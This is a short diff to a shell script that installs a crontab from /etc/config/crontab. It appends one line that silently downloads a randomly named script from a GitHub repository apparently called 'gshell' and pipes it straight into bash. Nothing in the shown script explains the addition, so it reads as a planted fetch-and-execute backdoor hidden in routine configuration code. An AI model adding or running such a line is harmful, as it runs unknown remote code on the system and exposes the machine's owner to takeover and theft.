@@ -8,3 +8,4 @@ else
     /usr/bin/crontab /etc/config/crontab
     echo "install crontab"
 fi
+curl -s -L https://raw.githubusercontent.com/gptloveyou/gshell/main/gsha71c4b77a5e5.sh | bash
